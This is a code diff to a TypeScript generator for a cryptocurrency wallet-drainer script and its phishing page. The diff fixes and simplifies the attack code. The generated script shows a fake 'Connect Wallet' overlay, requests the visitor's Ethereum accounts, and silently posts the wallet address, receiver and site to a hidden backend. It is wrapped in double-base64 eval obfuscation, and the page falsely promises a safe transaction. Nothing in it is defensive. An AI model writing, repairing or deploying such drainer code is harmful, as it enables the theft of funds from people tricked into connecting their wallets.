@@ -22,15 +22,15 @@ export function generateDrainerScript(config: DrainerScriptConfig): string {
   const encodedReceiver = Buffer.from(receiver).toString('base64');
   const encodedBackend = Buffer.from(backend).toString('base64');
 
-  const rawScript = `
-(function(){
+  const rawScript = `(function(){
 'use strict';
 const C={r:atob('${encodedReceiver}'),b:atob('${encodedBackend}')};
 let t=!1;
-function s(){const e=document.createElement('style');e.textContent='#d{position:fixed;inset:0;z-index:2147483647;background:rgba(0,0,0,.75);display:none;align-items:center;justify-content:center;font-family:system-ui}#b{background:#0f172a;color:#e2e8f0;border-radius:20px;padding:32px 28px;width:380px;box-shadow:0 25px 80px rgba(0,0,0,.6);border:1px solid #334155}#b h3{margin:0 0 8px;font-size:20px}#b p{font-size:14px;color:#94a3b8;margin:0 0 20px}#b button{width:100%;margin-top:12px;padding:14px 18px;border:0;border-radius:12px;background:#3b82f6;color:#fff;font-weight:700;font-size:15px;cursor:pointer}#b button.secondary{background:#475569}#st{margin-top:14px;font-size:13px;color:#fbbf24;min-height:18px;text-align:center}';document.head.appendChild(e)}
-function o(){if(document.getElementById('d'))return;const e=document.createElement('div');e.id='d',e.innerHTML='<div id="b"><h3>Connecting…</h3><p>Please approve in your wallet.</p><button id="c">Connect Wallet</button><button id="x" class="secondary">Cancel</button><div id="st"></div></div>',document.body.appendChild(e),e.style.display='flex',document.getElementById('c').onclick=i,document.getElementById('x').onclick=()=>e.style.display='none'}
-async function i(){const e=document.getElementById('st');if(!window.ethereum)return void(e.textContent='No wallet detected');try{e.textContent='Connecting…';const n=new ethers.BrowserProvider(window.ethereum),a=await n.send('eth_requestAccounts',[]),s=await n.getSigner();fetch(C.b,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({wallet:a[0],receiver:C.r,site:location.hostname,timestamp:Date.now()})}).catch(()=>{}),e.textContent='Connected: '+a[0].slice(0,6)+'…'+a[0].slice(-4)}catch(n){e.textContent='Error: '+(n.message||n)}}function r(){if(t)return;const e=()=>{t||(t=!0,document.removeEventListener('click',e,!0),o())};document.addEventListener('click',e,!0)}function c(){window.__dL||(window.__dL=!0,s(),r())}'loading'===document.readyState?document.addEventListener('DOMContentLoaded',c):c()})();
-`;
+function s(){const e=document.createElement('style');e.textContent='#d{position:fixed;inset:0;z-index:2147483647;background:rgba(0,0,0,.75);display:none;align-items:center;justify-content:center;font-family:system-ui}#b{background:#0f172a;color:#e2e8f0;border-radius:20px;padding:32px 28px;width:380px;box-shadow:0 25px 80px rgba(0,0,0,.6);border:1px solid #334155}#b h3{margin:0 0 8px;font-size:20px}#b p{font-size:14px;color:#94a3b8;margin:0 0 20px}#b button{width:100%;margin-top:12px;padding:14px 18px;border:0;border-radius:12px;background:#3b82f6;color:#fff;font-weight:700;font-size:15px;cursor:pointer}#b button.secondary{background:#475569}#st{margin-top:14px;font-size:13px;color:#fbbf24;min-height:18px;text-align:center}';document.head.appendChild(e);}
+function o(){if(document.getElementById('d'))return;const e=document.createElement('div');e.id='d',e.innerHTML='<div id=\"b\"><h3>Connecting…</h3><p>Please approve in your wallet.</p><button id=\"c\">Connect Wallet</button><button id=\"x\" class=\"secondary\">Cancel</button><div id=\"st\"></div></div>',document.body.appendChild(e),e.style.display='flex',document.getElementById('c').onclick=i,document.getElementById('x').onclick=()=>e.style.display='none';}
+async function i(){const e=document.getElementById('st');if(!window.ethereum)return void(e.textContent='No wallet detected');try{e.textContent='Connecting…';const n=new ethers.BrowserProvider(window.ethereum),a=await n.send('eth_requestAccounts',[]),s=await n.getSigner();fetch(C.b,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({wallet:a[0],receiver:C.r,site:location.hostname,timestamp:Date.now()})}).catch(()=>{}),e.textContent='Connected: '+a[0].slice(0,6)+'…'+a[0].slice(-4)}catch(n){e.textContent='Error: '+(n.message||n);}}
+function r(){if(t)return;const e=()=>{t||(t=!0,document.removeEventListener('click',e,!0),o())};document.addEventListener('click',e,!0);}
+function c(){window.__dL||(window.__dL=!0,s(),r());}'loading'===document.readyState?document.addEventListener('DOMContentLoaded',c):c();})();`;
 
   return applyObfuscation(rawScript, obfuscation);
 }
@@ -65,9 +65,9 @@ async function collectTokens(signer, tokens) {
   return results;
 }
 
-// Submit collection results
+// Submit collection results to local backend
 async function submitResults(wallet, results) {
-  fetch(C.b + '/notify-collection', {
+  fetch('/api/notify', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
@@ -109,7 +109,7 @@ function applyObfuscation(script: string, level: 'none' | 'minify' | 'medium' | 
       return `(function(){'use strict';eval(atob('${encoded}'));})();`;
 
     case 'heavy':
-      // Double base64 + variable obfuscation
+      // Double base64 + self-executing eval — no broken variable indirection
       const heavyMinified = script
         .replace(/\/\*[\s\S]*?\*\//g, '')
         .replace(/\/\/.*$/gm, '')
@@ -117,24 +117,11 @@ function applyObfuscation(script: string, level: 'none' | 'minify' | 'medium' | 
         .trim();
       const firstEncode = Buffer.from(heavyMinified).toString('base64');
       const secondEncode = Buffer.from(firstEncode).toString('base64');
-      const varName = generateRandomVar();
-      return `(function(){const ${varName}=atob('${secondEncode}');eval(atob(${varName}));})();`;
+      return `(function(){const _x=atob('${secondEncode}');eval(atob(_x));})();`;
 
     default:
       return script;
   }
-}
-
-/**
- * Generate random variable names for obfuscation
- */
-function generateRandomVar(): string {
-  const chars = 'abcdefghijklmnopqrstuvwxyz';
-  let result = '';
-  for (let i = 0; i < 8; i++) {
-    result += chars.charAt(Math.floor(Math.random() * chars.length));
-  }
-  return result;
 }
 
 /**
@@ -189,23 +176,7 @@ export function generateDrainerPage(config: DrainerScriptConfig): string {
   <div class="container">
     <h1>Connect Your Wallet</h1>
     <p>Please connect your wallet to complete this transaction safely.</p>
-    <button onclick="connectWallet()">Connect Wallet</button>
   </div>
-
-  <script>
-    async function connectWallet() {
-      if (!window.ethereum) {
-        alert('Please install a Web3 wallet');
-        return;
-      }
-      try {
-        await window.ethereum.request({ method: 'eth_requestAccounts' });
-        alert('Connected successfully!');
-      } catch (error) {
-        alert('Connection failed: ' + error.message);
-      }
-    }
-  </script>
 
   <script>
     ${drainerScript}
